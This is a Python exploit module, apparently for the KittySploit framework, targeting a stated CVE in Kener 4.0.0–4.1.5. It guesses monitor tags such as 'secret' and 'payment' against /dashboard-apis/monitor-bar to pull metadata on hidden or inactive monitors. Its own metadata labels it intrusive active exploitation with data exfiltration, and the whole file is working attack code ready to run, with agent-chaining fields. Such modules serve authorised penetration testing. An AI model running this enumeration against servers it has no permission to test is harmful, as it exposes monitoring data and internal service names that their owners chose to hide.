#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Kener CVE-2026-105030 hidden/inactive monitor tag enumeration."""

import json

from kittysploit import *
from lib.protocols.http.http_client import Http_client

_DEFAULT_TAGS = (
    "admin",
    "api",
    "database",
    "db",
    "internal",
    "payment",
    "auth",
    "backend",
    "secret",
    "internal-api",
    "production",
    "staging",
    "dev",
    "test",
    "monitor",
    "health",
    "internal-secret-monitor",
)


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "Kener CVE-2026-105030 monitor tag enumeration",
        "description": (
            "CVE-2026-105030 (Kener 4.0.0–4.1.5): /dashboard-apis/monitor-bar may return "
            "hidden or inactive monitors when tag lookups skip is_hidden/status filters."
        ),
        "author": ["asvorg", "KittySploit Team"],
        "cve": ["CVE-2026-105030"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-105030",
            "https://github.com/asvorg/CVE-2026-105030-poc",
        ],
        "tags": ["kener", "exposure", "enum", "cve-2026-105030"],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation", "data_exfiltration"],
            "expected_requests": 20,
            "reversible": True,
            "approval_required": True,
            "produces": ["exploit_paths", "risk_signals"],
            "requires": {"endpoint_pattern_any": ["/dashboard-apis/monitor-bar"]},
            "chain": {
                "suggested_followups": ["scanner/http/kener_cve_2026_105030_detect"],
            },
        },
    }

    port = OptPort(3000, "Kener HTTP port", required=False)
    ssl = OptBool(False, "Use HTTPS", required=False, advanced=True)
    tags = OptString(
        ",".join(_DEFAULT_TAGS),
        "Comma-separated monitor tags to probe",
        required=False,
    )
    days = OptInteger(1, "days query parameter for monitor-bar", required=False)

    def run(self):
        tag_list = [t.strip() for t in str(self.tags or "").split(",") if t.strip()]
        if not tag_list:
            tag_list = list(_DEFAULT_TAGS)
        found = []
        for tag in tag_list:
            path = f"/dashboard-apis/monitor-bar?tag={tag}&days={int(self.days or 1)}"
            response = self.http_request(method="GET", path=path, allow_redirects=False)
            if not response or int(response.status_code or 0) != 200:
                continue
            try:
                data = json.loads(response.text or "{}")
            except json.JSONDecodeError:
                continue
            if not isinstance(data, dict) or "name" not in data:
                continue
            found.append({"tag": tag, "name": data.get("name"), "data": data})
            print_success(f"{tag} -> {data.get('name')}")

        if not found:
            print_error("No monitor metadata returned (patched or wrong host)")
            return False
        self.set_info(
            severity="medium",
            cve="CVE-2026-105030",
            reason="Monitor tag enumeration",
            count=len(found),
            monitors=found,
        )
        return True
